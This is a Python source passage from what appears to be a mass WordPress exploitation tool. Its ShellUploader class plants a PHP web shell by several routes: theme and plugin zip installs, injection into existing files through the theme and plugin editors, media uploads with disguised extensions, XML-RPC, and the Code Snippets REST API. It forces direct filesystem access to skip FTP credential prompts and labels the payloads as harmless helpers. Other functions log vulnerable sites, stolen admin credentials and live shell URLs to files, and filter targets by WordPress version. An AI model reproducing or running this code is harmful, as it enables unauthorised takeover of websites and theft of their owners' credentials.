        self._opener = opener or self.c.opener(urllib.request.HTTPCookieProcessor(self._jar))
        self.last_error = ""
        self.shell_url = None
        self._deploy_method = ""
        self._deploy_deadline = 0.0
        self._username = username
        self._password = password

        self._wp_path = ""
        if wp_path:
            self._set_wp_path(wp_path)

    def _set_wp_path(self, login_url):
        try:
            p = urllib.parse.urlsplit(login_url)
            path = p.path or ""

            for suffix in ("/wp-login.php", "/wp-login", "/login", "/entrar", "/acesso"):
                if path.endswith(suffix):
                    path = path[:-len(suffix)]
                    break
            path = path.rstrip("/")
            if path and path != urllib.parse.urlsplit(self.base).path.rstrip("/"):
                self._wp_path = path

                self.base = f"{p.scheme}://{p.netloc}{path}"
        except Exception:
            pass

    @classmethod
    def from_verifier(cls, verifier, shell_path, username=None, password=None):
        obj = cls(verifier.base, verifier.c, shell_path=shell_path,
                   jar=verifier._jar, opener=verifier._opener,
                   username=username, password=password)
        if verifier.login_url:
            obj._set_wp_path(verifier.login_url)
        return obj

    def deploy(self):
        if not self.shell_path or not os.path.isfile(self.shell_path):
            raise RuntimeError(f"shell file not found: {self.shell_path!r}")
        with open(self.shell_path, "rb") as f:
            php = f.read()
        if not php.strip():
            raise RuntimeError("shell file empty")

        if b"<?" not in php[:200]:
            php = b"<?php\n" + php

        self._deploy_deadline = time.time() + DEPLOY_BUDGET_SEC
        # Pre-probe surfaces so dead UI (403 wp-admin / login trap) is skipped
        # instantly instead of burning the whole deploy budget on page fetches.
        avail = self._probe_deploy_surfaces()
        plan = (
            ("theme-zip",      self._deploy_theme_zip,      avail.get("themezip", False)),
            ("plugin",         self._deploy_plugin,         avail.get("pluginzip", False)),
            ("theme-editor",   self._deploy_theme_editor,   avail.get("theme_editor", False)),
            ("plugin-editor",  self._deploy_plugin_editor,  avail.get("plugin_editor", False)),
            ("media-php",      self._deploy_media,          avail.get("media", False)),
            ("xmlrpc-php",     self._deploy_xmlrpc,         bool(self._username and self._password)),
            ("code-snippets",  self._deploy_code_snippets,  True),
        )
        for name, fn, available in plan:
            if time.time() > self._deploy_deadline:
                log("    shell deploy budget exhausted", "!")
                break
            if not available:
                log(f"    shell skip {name} (surface unavailable)", "!")
                continue
            try:
                url = fn(php)
            except Exception as e:
                self.last_error = f"{name}: {type(e).__name__}: {e}"
                log(f"    shell {name} deploy fail: {self.last_error}", "!")
                continue
            if not url:
                continue
            live = self._confirm_shell(url)
            if live:
                self.shell_url = live
                self._deploy_method = name
                log(f"    shell deployed via {name}: {live}", "+")
                return live
            self.last_error = f"{name} installed but shell not live: {url}"
            log(f"    shell probe fail via {name} (not 200/title): {url}", "!")
        raise RuntimeError(self.last_error or "shell upload failed")

    def _probe_deploy_surfaces(self):
        """Fast map of which PHP-drop UIs exist for this session."""
        out = {
            "pluginzip": False, "themezip": False,
            "plugin_editor": False, "theme_editor": False,
            "media": False, "dashboard": False,
        }
        checks = (
            ("pluginzip", "/wp-admin/plugin-install.php?tab=upload",
             ("pluginzip", 'name="pluginzip"')),
            ("themezip", "/wp-admin/theme-install.php?tab=upload",
             ("themezip", 'name="themezip"')),
            ("plugin_editor", "/wp-admin/plugin-editor.php",
             ("newcontent", "plugin-editor")),
            ("theme_editor", "/wp-admin/theme-editor.php",
             ("newcontent", "theme-editor")),
            ("media", "/wp-admin/media-new.php",
             ("async-upload", "media-new")),
        )
        # BUGFIX: probe must hit ABSOLUTE URLs. The raw `path` entries below are
        # site-relative (e.g. "/wp-admin/plugin-install.php"). urllib.request.Request
        # rejects scheme-less URLs with ValueError, which the bare `except: continue`
        # used to swallow — silently marking every surface unavailable and skipping
        # 5 of 7 deploy methods. Iterate _admin_url_candidates() (absolute bases,
        # includes subdir-WP variants) like the real deploy methods do.
        bases = self._admin_url_candidates()
        for key, path, needles in checks:
            if time.time() > self._deploy_deadline:
                break
            low = ""
            for base in bases:
                if time.time() > self._deploy_deadline:
                    break
                try:
                    body, _, status = self._open(base + path, timeout=min(self.c.timeout, 10))
                except Exception:
                    continue
                if not body or (status and status >= 400):
                    continue
                low = body.lower()
                # Login / 2FA trap pages are not usable surfaces
                if "log in" in low[:400] and "wpadminbar" not in low:
                    continue
                break  # first reachable admin page wins
            if not low or not any(n.lower() in low for n in needles):
                continue
            if key in ("pluginzip", "themezip"):
                out[key] = needles[0] in low or needles[1] in low
            elif key in ("plugin_editor", "theme_editor"):
                out[key] = "newcontent" in low
            else:
                out[key] = True
        return out

    def _deploy_req_timeout(self):
        left = self._deploy_deadline - time.time()
        if left <= 0:
            return 3.0
        return max(3.0, min(12.0, left - 0.5))

    def _deploy_plugin(self, php):

        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        used_base = self.base
        for admin in admin_paths:
            for tab_url in (
                f"{admin}/wp-admin/plugin-install.php?tab=upload",
                f"{admin}/wp-admin/plugin-install.php",
            ):
                try:
                    page, final, status = self._open(tab_url)
                except Exception:
                    continue
                if not page or (status and status >= 400):
                    continue
                if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                    continue
                nonce = self._nonce(page) or self._nonce_any(page, "plugin-upload")
                if nonce:
                    used_base = admin
                    break
            if nonce:
                break
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found (wp-admin not accessible or not admin)")
        zip_bytes = self._plugin_zip(php)

        body, ctype = self._multipart(
            {
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now",
                "connection_type": "direct",
                "hostname": "",
                "username": "",
                "password": "",
                "public_key": "",
                "private_key": "",
            },
            {"pluginzip": (f"{self._slug}.zip", zip_bytes)},
        )
        resp, final, status = self._open(
            f"{used_base}/wp-admin/update.php?action=upload-plugin",
            data=body, content_type=ctype,
            referer=f"{used_base}/wp-admin/plugin-install.php?tab=upload",
            timeout=self._deploy_req_timeout(),
        )

        if resp and self._needs_ftp_creds(resp):

            resp, final, status = self._submit_ftp_bypass(
                resp, final or f"{used_base}/wp-admin/update.php?action=upload-plugin",
                used_base, zip_bytes=zip_bytes, extra_fields={
                    "install-plugin-submit": "Install Now",
                },
            )

        act = re.search(r'href="([^"]*action=activate[^"]*)"', resp or "")
        if act:
            act_url = html.unescape(act.group(1).replace("&amp;", "&"))
            if act_url.startswith("/"):
                act_url = used_base + act_url
            elif not act_url.startswith("http"):
                act_url = used_base + "/" + act_url
            try:
                self._open(act_url, referer=final or f"{used_base}/wp-admin/")
            except Exception:
                pass
        rel = f"/wp-content/plugins/{self._slug}/{self._slug}.php"
        return used_base + rel

    @staticmethod
    def _needs_ftp_creds(html_body):
        if not html_body:
            return False
        low = html_body.lower()
        return (
            "connection_type" in low
            or "ftp hostname" in low
            or "hostname" in low and "ftp" in low
            or "request_filesystem_credentials" in low
            or ('name="hostname"' in low and "ftp" in low)
            or "to perform the requested action, wordpress needs to access your web server" in low
        )

    def _submit_ftp_bypass(self, page, action_url, used_base, zip_bytes=None, extra_fields=None):
        fields = self._form_fields_from_html(page)
        fields["connection_type"] = "direct"
        fields["hostname"] = fields.get("hostname", "")
        fields["username"] = fields.get("username", "")
        fields["password"] = fields.get("password", "")
        fields["public_key"] = fields.get("public_key", "")
        fields["private_key"] = fields.get("private_key", "")
        if extra_fields:
            fields.update(extra_fields)

        m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', page, re.I)
        if m and m.group(1):
            action_url = html.unescape(m.group(1))
            if action_url.startswith("/"):
                action_url = used_base + action_url
            elif not action_url.startswith("http"):
                action_url = used_base + "/wp-admin/" + action_url.lstrip("/")
        if zip_bytes is not None:
            body, ctype = self._multipart(fields, {"pluginzip": (f"{self._slug}.zip", zip_bytes)})
            return self._open(action_url, data=body, content_type=ctype, referer=used_base + "/wp-admin/")
        return self._open(action_url, data=fields, referer=used_base + "/wp-admin/")

    @staticmethod
    def _form_fields_from_html(html_body):
        fields = {}
        for m in re.finditer(r"<input[^>]+>", html_body or "", re.I):
            tag = m.group(0)
            nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
            if not nm:
                continue
            name = html.unescape(nm.group(1))
            typ = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
            t = (typ.group(1).lower() if typ else "text")
            if t in ("file",):
                continue
            if t in ("checkbox", "radio") and not re.search(r'(?:^|\s)checked(?=[\s=/>]|$)', tag, re.I):

                if name == "connection_type":
                    val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                    if val_m and val_m.group(1) == "direct":
                        fields[name] = "direct"
                    continue
                continue
            val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
            fields[name] = html.unescape(val_m.group(1) if val_m else "")

        fields["connection_type"] = "direct"
        return fields

    def _admin_url_candidates(self):
        cands = []
        seen = set()
        def add(u):
            u = u.rstrip("/")
            if u not in seen:
                seen.add(u)
                cands.append(u)

        add(self.base)

        try:
            p = urllib.parse.urlsplit(self.base)
            root = f"{p.scheme}://{p.netloc}"
            add(root)

            if self.base == root:
                for sub in ("/wp", "/wordpress", "/blog", "/site", "/cms"):
                    add(root + sub)

            if p.path and p.path != "/":
                add(root + p.path.rstrip("/"))
        except Exception:
            pass
        return cands

    @staticmethod
    def _looks_like_login_page(body):
        if not body:
            return False
        low = body.lower()
        return any(m in low for m in ('name="log"', 'id="user_login"', "wp-submit"))

    def _deploy_media(self, php):
        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        used_base = self.base
        for admin in admin_paths:
            try:
                page, final, status = self._open(f"{admin}/wp-admin/media-new.php")
            except Exception:
                continue
            if not page or (status and status >= 400):
                continue
            if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                continue
            nonce = self._nonce_any(page, "media-form") or self._nonce_any(page)
            if nonce:
                used_base = admin
                break
        if not nonce:
            raise RuntimeError("media nonce not found (wp-admin not accessible)")
        for name in (f"{self._slug}.php", f"{self._slug}.phtml", f"{self._slug}.php.jpg"):
            body, ctype = self._multipart(
                {
                    "name": name,
                    "action": "upload-attachment",
                    "_wpnonce": nonce,
                    "post_id": "0",
                },
                {"async-upload": (name, php)},
            )
            resp, _, status = self._open(
                f"{used_base}/wp-admin/async-upload.php",
                data=body, content_type=ctype,
                referer=f"{used_base}/wp-admin/media-new.php",
                timeout=self._deploy_req_timeout(),
            )
            if not resp:
                continue
            try:
                data = json.loads(resp)
                url = (data.get("data") or {}).get("url") if isinstance(data, dict) else None
                if url:
                    return url
            except Exception:
                pass
            m = re.search(r'https?://[^\s"\'<>]+\.(?:php|phtml|php\.\w+)', resp)
            if m:
                return m.group(0)
        raise RuntimeError("media upload returned no URL")

    def _deploy_theme_zip(self, php):
        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        used_base = self.base
        for admin in admin_paths:
            for tab_url in (
                f"{admin}/wp-admin/theme-install.php?tab=upload",
                f"{admin}/wp-admin/theme-install.php",
            ):
                try:
                    page, final, status = self._open(tab_url)
                except Exception:
                    continue
                if not page or (status and status >= 400):
                    continue
                if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                    continue
                nonce = self._nonce_any(page, "theme-upload") or self._nonce_any(page)
                if nonce:
                    used_base = admin
                    break
            if nonce:
                break
        if not nonce:
            raise RuntimeError("theme-upload nonce not found")

        slug = "twk_" + secrets.token_hex(4)
        style = f"/*\nTheme Name: TWK {slug}\nDescription: temporary\nVersion: 1.0\n*/\n"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{slug}/style.css", style)
            z.writestr(f"{slug}/index.php", "<?php\n// silence\n")
            z.writestr(f"{slug}/functions.php", php)
        body, ctype = self._multipart(
            {
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/theme-install.php?tab=upload",
                "install-theme-submit": "Install Now",
            },
            {"themezip": (f"{slug}.zip", buf.getvalue())},
        )
        self._open(
            f"{used_base}/wp-admin/update.php?action=upload-theme",
            data=body, content_type=ctype,
            referer=f"{used_base}/wp-admin/theme-install.php?tab=upload",
            timeout=self._deploy_req_timeout(),
        )
        return f"{used_base}/wp-content/themes/{slug}/functions.php"

    def _deploy_plugin_editor(self, php):
        used_base = None
        page = None
        for admin in self._admin_url_candidates():
            try:
                page, final, status = self._open(f"{admin}/wp-admin/plugin-editor.php")
            except Exception:
                continue
            if not page or (status and status >= 400):
                continue
            if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                continue
            if "newcontent" not in page and "plugin-editor.php" not in page:
                continue
            used_base = admin
            break
        if not used_base or page is None:
            raise RuntimeError("plugin-editor not accessible")

        plugins = re.findall(r'[?&]plugin=([^&"\']+\.php)', page, re.I)
        candidates = []
        for raw in plugins:
            p = urllib.parse.unquote(raw)
            if p not in candidates:
                candidates.append(p)
        if not candidates:
            files = re.findall(r'[?&]file=([^&"\']+\.php)', page, re.I)
            candidates = [urllib.parse.unquote(f) for f in files]
        for plugin_file in candidates[:8]:
            path = self._edit_plugin_file(used_base, plugin_file, php)
            if path:
                return path
        raise RuntimeError("no editable plugin file found")

    def _edit_plugin_file(self, base, plugin_file, php):
        q = urllib.parse.quote(plugin_file, safe="/")
        try:
            edit_page, _, _ = self._open(f"{base}/wp-admin/plugin-editor.php?file={q}&plugin={q}")
        except Exception:
            return None
        if "newcontent" not in edit_page:
            try:
                edit_page, _, _ = self._open(
                    f"{base}/wp-admin/plugin-editor.php?plugin={urllib.parse.quote(plugin_file, safe='')}"
                )
            except Exception:
                return None
        original = self._extract_textarea(edit_page, "newcontent")
        if original is None:
            return None
        nonce = self._extract_form_value(edit_page, "nonce") or self._nonce_any(edit_page)
        if not nonce:
            return None
        file_field = self._extract_form_value(edit_page, "file") or plugin_file
        plugin_field = self._extract_form_value(edit_page, "plugin") or plugin_file
        newcontent = self._inject_php_payload(original, php)
        try:
            self._open(f"{base}/wp-admin/plugin-editor.php", data={
                "_wpnonce": nonce,
                "nonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-editor.php",
                "newcontent": newcontent,
                "action": "update",
                "file": file_field,
                "plugin": plugin_field,
                "scrollto": "0",
                "submit": "Update File",
            })
        except Exception:
            return None
        path = "/wp-content/plugins/" + plugin_field.lstrip("/")
        if not path.endswith(".php"):
            path = "/wp-content/plugins/" + file_field.lstrip("/")
        return base + path

    def _deploy_theme_editor(self, php):
        used_base = None
        page = None
        for admin in self._admin_url_candidates():
            try:
                page, final, status = self._open(f"{admin}/wp-admin/theme-editor.php")
            except Exception:
                continue
            if not page or (status and status >= 400):
                continue
            if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                continue
            if "newcontent" not in page and "theme-editor.php" not in page:
                continue
            used_base = admin
            break
        if not used_base or page is None:
            raise RuntimeError("theme-editor not accessible")

        theme = self._extract_form_value(page, "theme") or self._guess_stylesheet()
        file_rel = self._extract_form_value(page, "file") or "functions.php"
        for cand in (file_rel, "functions.php"):
            if not cand:
                continue
            path = self._edit_theme_file(used_base, theme, cand, php)
            if path:
                return path
        raise RuntimeError("theme editor update failed")

    def _edit_theme_file(self, base, theme, file_rel, php):
        try:
            edit_page, _, _ = self._open(
                f"{base}/wp-admin/theme-editor.php?file={urllib.parse.quote(file_rel, safe='/')}"
                f"&theme={urllib.parse.quote(theme or '', safe='')}"
            )
        except Exception:
            return None
        theme = theme or self._extract_form_value(edit_page, "theme") or ""
        nonce = self._extract_form_value(edit_page, "nonce") or self._nonce_any(edit_page)
        original = self._extract_textarea(edit_page, "newcontent")
        if original is None or not nonce:
            return None
        newcontent = self._inject_php_payload(original, php)
        try:
            self._open(f"{base}/wp-admin/theme-editor.php", data={
                "_wpnonce": nonce,
                "nonce": nonce,
                "_wp_http_referer": "/wp-admin/theme-editor.php",
                "newcontent": newcontent,
                "action": "update",
                "file": file_rel,
                "theme": theme,
                "scrollto": "0",
                "submit": "Update File",
            })
        except Exception:
            return None
        theme_slug = theme or self._guess_stylesheet()
        if not theme_slug:
            return None
        return f"{base}/wp-content/themes/{theme_slug}/{file_rel.lstrip('/')}"

    def _guess_stylesheet(self):
        try:
            body, _, _ = self._open(self.base + "/?rest_route=/wp/v2/themes")
            data = json.loads(body)
            if isinstance(data, list):
                for t in data:
                    if t.get("status") == "active":
                        return t.get("stylesheet")
        except Exception:
            pass
        try:
            body, _, _ = self._open(self.base + "/")
        except Exception:
            return None
        m = re.search(r"/wp-content/themes/([^/\"']+)/", body or "")
        return m.group(1) if m else None

    def _deploy_xmlrpc(self, php):
        if not self._username or not self._password:
            raise RuntimeError("xmlrpc needs stored credentials")
        for ext in (".php", ".phtml"):
            fname = f"wp2s_{secrets.token_hex(4)}{ext}"
            url = self._xmlrpc_upload_file(fname, php)
            if url:
                return url
        raise RuntimeError("xmlrpc upload returned no URL")

    def _xmlrpc_upload_file(self, fname, data):
        b64 = base64.b64encode(data).decode("ascii")
        def esc(s):
            return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        user_x = esc(self._username)
        pass_x = esc(self._password)
        struct = (
            f"<member><name>name</name><value><string>{fname}</string></value></member>"
            f"<member><name>type</name><value><string>application/octet-stream</string></value></member>"
            f"<member><name>bits</name><value><base64>{b64}</base64></value></member>"
            f"<member><name>overwrite</name><value><boolean>1</boolean></value></member>"
        )
        params = (
            f"<param><value><string>1</string></value></param>"
            f"<param><value><string>{user_x}</string></value></param>"
            f"<param><value><string>{pass_x}</string></value></param>"
            f"<param><value><struct>{struct}</struct></value></param>"
        )
        for method in ("wp.uploadFile", "metaWeblog.newMediaObject"):
            body = (
                f'<?xml version="1.0" encoding="UTF-8"?>'
                f"<methodCall><methodName>{method}</methodName>"
                f"<params>{params}</params></methodCall>"
            )
            resp, _, status = self._open(
                self.base + "/xmlrpc.php",
                data=body.encode("utf-8"), content_type="text/xml",
                timeout=self._deploy_req_timeout(),
            )
            if "Incorrect username or password" in (resp or ""):
                return None
            m = re.search(r"<name>url</name>\s*<value>\s*<string>([^<]+)</string>", resp or "", re.I | re.S)
            if m:
                full = html.unescape(m.group(1).strip())
                # BUGFIX: return an ABSOLUTE URL. The old code returned only the
                # path (urlsplit(full).path), so _confirm_shell built a scheme-less
                # probe URL that urllib rejected with ValueError -> every xmlrpc
                # upload "installed but probe failed".
                parsed = urllib.parse.urlsplit(full)
                return full if parsed.scheme in ("http", "https") else self.base + parsed.path
        return None

    def _deploy_code_snippets(self, php):
        if not any(c.name.startswith("wordpress_logged_in") for c in self._jar):
            raise RuntimeError("code-snippets needs cookie auth")
        try:
            home, _, _ = self._open(self.base + "/")
        except Exception:
            home = ""
        m = re.search(
            r'wpApiSettings\s*=\s*\{[^}]*"nonce"\s*:\s*"([a-f0-9]+)"',
            home or "", re.I | re.S,
        )
        rest_nonce = m.group(1) if m else None
        if not rest_nonce:
            nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,})"', home or "")
            rest_nonce = nonces[0] if nonces else None
        if not rest_nonce:
            raise RuntimeError("no REST nonce on front page")

        def rest(path, method="GET", data=None):
            url = f"{self.base}/?rest_route={urllib.parse.quote(path, safe='/%')}"
            body = json.dumps(data).encode() if data is not None else None
            req = urllib.request.Request(url, data=body, method=method,
                                         headers={"User-Agent": self.c.ua})
            req.add_header("X-WP-Nonce", rest_nonce)
            req.add_header("Accept", "application/json")
            if body is not None:
                req.add_header("Content-Type", "application/json")
            try:
                r = self._opener.open(req, timeout=max(self.c.timeout, 30.0))
                return r.status, r.read().decode("utf-8", "replace")
            except urllib.error.HTTPError as e:
                try:
                    return e.code, e.read().decode("utf-8", "replace")
                except Exception:
                    return e.code, ""
            except Exception:
                return 0, ""

        rest("/wp/v2/plugins", "POST", {"slug": "code-snippets", "status": "active"})

        code = php.decode("utf-8", "replace").strip()
        if code.startswith("<?php"):
            code = code[5:].lstrip()
        elif code.startswith("<?"):
            code = code[2:].lstrip()
        st, body = rest("/code-snippets/v1/snippets", "POST", {
            "name": "w2s-cache-" + secrets.token_hex(3),
            "desc": "cache helper",
            "code": code,
            "scope": "global",
            "active": True,
            "priority": 1,
        })
        if st not in (200, 201) and "code-snippets" not in body:
            raise RuntimeError(f"code-snippets create failed: {st}")
        return self.base + "/"

    def _plugin_zip(self, php):

        header = (
            b"<?php\n"
            b"/*\n"
            b"Plugin Name: " + self._slug.encode() + b"\n"
            b"Description: helper\n"
            b"Version: 1.0\n"
            b"*/\n"
        )
        raw = php.lstrip()
        if raw.startswith(b"<?php"):
            raw = raw[5:].lstrip(b"\r\n")
        elif raw.startswith(b"<?"):
            raw = raw[2:].lstrip(b"\r\n")
        content = header + raw
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/{self._slug}.php", content)
        return buf.getvalue()

    def _shell_probe_url(self, url):
        """Append ?x-head=function (or & if query exists)."""
        if not url:
            return url
        if "x-head=" in url:
            return url
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{_SHELL_PROBE_QS}"

    def _confirm_shell(self, url):
        """Probe shell with ?x-head=function; confirm via marker title/body.

        Marker source (first wins):
          - env WP2SHELL_OK_TITLE        (custom shell marker; overrides default)
          - module default _SHELL_OK_TITLE ("Runtime - File Configuration")
        Set env WP2SHELL_CONFIRM_ANY_200=1 to ALSO accept any clearly-non-WP
        200 response — for custom shells that emit no unique marker. The
        homepage (code-snippets surface) is excluded from this relaxed mode.

        Returns canonical live URL (with query) or None if 4xx / wrong page.
        """
        if not url:
            return None
        probe = self._shell_probe_url(url)
        # brief settle — plugin file may lag on slow FS
        time.sleep(0.4)
        try:
            body, final, status = self._open(probe, timeout=min(10.0, self._deploy_req_timeout()))
        except Exception:
            return None
        if status == 404 or (status and status >= 400):
            return None
        text = body or ""
        marker = (os.environ.get("WP2SHELL_OK_TITLE") or _SHELL_OK_TITLE).lower()
        # marker confirmation (user shell marker) — body or <title>
        if marker and marker in text.lower():
            return probe
        m = re.search(r"<title[^>]*>([^<]*)</title>", text, re.I)
        if m and marker in m.group(1).lower():
            return probe
        # Relaxed fallback (opt-in via WP2SHELL_CONFIRM_ANY_200=1): accept a 200
        # that is clearly not a WP login/error/not-found page and not the site
        # homepage (so code-snippets, which probes `/`, stays strict).
        if os.environ.get("WP2SHELL_CONFIRM_ANY_200") == "1":
            low = text.lower()
            u_path = (urllib.parse.urlsplit(probe).path or "/").rstrip("/") or "/"
            is_homepage = u_path in ("", "/", "/index.php")
            wp_non_shell = (
                "wp-login.php", "wp_die", "fatal error", "parse error",
                "does not exist", "not found", "nothing found", "404",
                "forbidden", "cannot be accessed directly", "no such file",
                "you do not have sufficient permissions",
            )
            if (status == 200 and len(text.strip()) > 50
                    and not self._looks_like_login_page(text)
                    and not any(s in low for s in wp_non_shell)
                    and not is_homepage):
                return probe
        # still 200 but wrong body — not our shell / blocked
        return None

    def _probe(self, url):
        return bool(self._confirm_shell(url))

    @staticmethod
    def _nonce(html_body):
        if not html_body:
            return None
        m = re.search(
            r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"',
            html_body, re.I | re.S,
        )
        if m:
            return m.group(1)
        m = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', html_body, re.I)
        if m:
            return m.group(1)
        m = re.search(r'value="([0-9a-f]+)"[^>]*name="_wpnonce"', html_body, re.I)
        return m.group(1) if m else None

    @staticmethod
    def _nonce_any(html_body, hint=None):
        if not html_body:
            return None
        if hint:
            m = re.search(
                rf'id=["\']{re.escape(hint)}["\'][^>]*>.*?name=["\']_wpnonce["\'][^>]*value=["\']([0-9a-f]+)["\']',
                html_body, re.I | re.S,
            )
            if m:
                return m.group(1)
        m = re.search(r'name=["\']_wpnonce["\'][^>]*value=["\']([0-9a-f]+)["\']', html_body, re.I)
        if m:
            return m.group(1)
        m = re.search(r'value=["\']([0-9a-f]{8,})["\'][^>]*name=["\']_wpnonce["\']', html_body, re.I)
        return m.group(1) if m else None

    @staticmethod
    def _extract_form_value(html_body, name):
        if not html_body:
            return None
        m = re.search(
            rf'<input[^>]+name=["\']{re.escape(name)}["\'][^>]+value=["\']([^"\']*)["\']',
            html_body, re.I,
        )
        if m:
            return html.unescape(m.group(1))
        m = re.search(
            rf'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']{re.escape(name)}["\']',
            html_body, re.I,
        )
        return html.unescape(m.group(1)) if m else None

    @staticmethod
    def _extract_textarea(html_body, name):
        if not html_body:
            return None
        m = re.search(
            rf'<textarea[^>]+name=["\']{re.escape(name)}["\'][^>]*>(.*?)</textarea>',
            html_body, re.S | re.I,
        )
        return html.unescape(m.group(1)) if m else None

    @staticmethod
    def _inject_php_payload(original, php):
        body = php.decode("utf-8", "replace").strip()
        if body.startswith("<?php"):
            body = body[5:].lstrip()
        elif body.startswith("<?"):
            body = body[2:].lstrip()
        block = "/*WP2S_BEGIN*/\n" + body + "\n/*WP2S_END*/\n"
        text = re.sub(r"/\*WP2S_BEGIN\*/.*?/\*WP2S_END\*/\s*", "", original, flags=re.S)
        stripped = text.lstrip()
        m = re.match(r"^(<\?php\b|<\?=|<?\?)\s*", stripped, re.I)
        if m:
            open_tag = m.group(1)
            rest = stripped[m.end():]
            if open_tag == "<?=":
                return "<?php\n" + block + "echo " + rest
            return "<?php\n" + block + rest
        return "<?php\n" + block + "?>\n" + original

    @staticmethod
    def _multipart(fields, files):
        boundary = "----wp2shell" + uuid.uuid4().hex
        buf = io.BytesIO()
        for name, value in fields.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode())
        for name, (filename, content) in files.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
            )
            buf.write(b"Content-Type: application/octet-stream\r\n\r\n")
            buf.write(content if isinstance(content, (bytes, bytearray)) else content.encode())
            buf.write(b"\r\n")
        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={boundary}"

    def _open(self, url, data=None, content_type=None, referer=None, timeout=None):
        headers = {"User-Agent": self.c.ua}
        if data is not None:
            if isinstance(data, dict):
                data = urllib.parse.urlencode(data).encode()
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            elif content_type:
                headers["Content-Type"] = content_type
        if referer:
            headers["Referer"] = referer
        req = urllib.request.Request(
            url, data=data, headers=headers,
            method="POST" if data is not None else "GET",
        )
        if self.c.delay:
            time.sleep(self.c.delay)
        last_exc = None
        for a in range(self.c.retries + 1):
            try:
                r = self._opener.open(req, timeout=timeout or max(self.c.timeout, 60.0))
                try:
                    body = r.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(r, "geturl", lambda: url)()
                status = getattr(r, "status", None) or getattr(r, "code", 200)
                try:
                    r.close()
                except Exception:
                    pass
                return body, final, status
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(e, "geturl", lambda: url)()
                try:
                    e.close()
                except Exception:
                    pass
                return body, final, e.code
            except Exception as e:
                last_exc = e
                if a < self.c.retries:
                    time.sleep(0.4 * (a + 1))
        raise last_exc if last_exc else Exception("shell upload request failed")

def detect_version(base, c):

    scan_cfg = dataclasses.replace(c, timeout=min(c.timeout, 10), retries=0)
    try:
        r = scan_cfg.send(scan_cfg.opener(), urllib.request.Request(base+"/readme.html", headers={"User-Agent":c.ua}))
        m = re.search(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)", r.body)
        if m:
            p = [int(x) for x in m.group(1).split(".")[:3] if x.isdigit()]
            while len(p)<3: p.append(0)
            return tuple(p[:3])
    except Exception:
        pass
    return None

def save_vulnerable(url):
    with write_lock:
        with open("vulnerable_live.txt", "a", encoding="utf-8") as f:
            f.write(f"{url}\n")

def save_admin_creds(target, username, password, email, verified=True, shell_url=None):
    tag = "" if verified else "|UNVERIFIED"
    shell = f"|{shell_url}" if shell_url else ""
    with write_lock:
        with open("admin_creds_live.txt", "a", encoding="utf-8") as f:
            f.write(f"{target}|{username}:{password}|{email}{tag}{shell}\n")

def save_shell_url(target, username, shell_url, method=""):
    with write_lock:
        with open("shells_live.txt", "a", encoding="utf-8") as f:
            extra = f"|{method}" if method else ""
            f.write(f"{target}|{username}|{shell_url}{extra}\n")

def self_deploy_shell(target, c, shell_file, verifier=None, adm=None):
    try:
        user = getattr(adm, "username", None) or ""
        pw = getattr(adm, "password", None) or ""
        if verifier is not None:
            uploader = ShellUploader.from_verifier(verifier, shell_file, username=user, password=pw)
        else:
            lv = LoginVerifier(target, c)
            if not user or not pw or not lv.login(user, pw):
                raise RuntimeError(f"login for shell upload failed: {getattr(lv, 'last_reason', '')}")
            uploader = ShellUploader.from_verifier(lv, shell_file, username=user, password=pw)
        shell_url = uploader.deploy()
        method = getattr(uploader, "_deploy_method", "") or "shell"
        log(f"SHELL {target} -> {shell_url} ({method})", "+")
        save_shell_url(target, user, shell_url, method=method)
        return shell_url
    except Exception as e:
        log(f"SHELL FAIL {target} -> {str(e)[:80]}", "-")
        return None

def process_target(target, c, args, idx, total):
    global total_vuln, total_success, total_fail

    is_single = total <= 1
    def vlog(msg, sym="*"):
        if is_single:
            log(f"[{idx}/{total}] {target} -> {msg}", sym)

    try:

        client = Batch(target, c)
        vlog("probing batch...", "*")
        try:
            probe = client.probe()
        except Exception:
            vlog("probe timeout", "!")
            return None
        if probe is None or probe.status != 207:
            vlog(f"no batch ({getattr(probe, 'status', '?')})", "!")
            return None

        ver = None
        ver_str = "unknown"
        if is_single:
            ver = detect_version(target, c)
            ver_str = ".".join(map(str, ver)) if ver else "unknown"
            if ver and ver in _PATCHED:
                vlog(f"patched ({ver_str})", "!")
                return None
            if ver and ver not in _FULL_CHAIN:
                vlog(f"out of range ({ver_str})", "!")
                return None

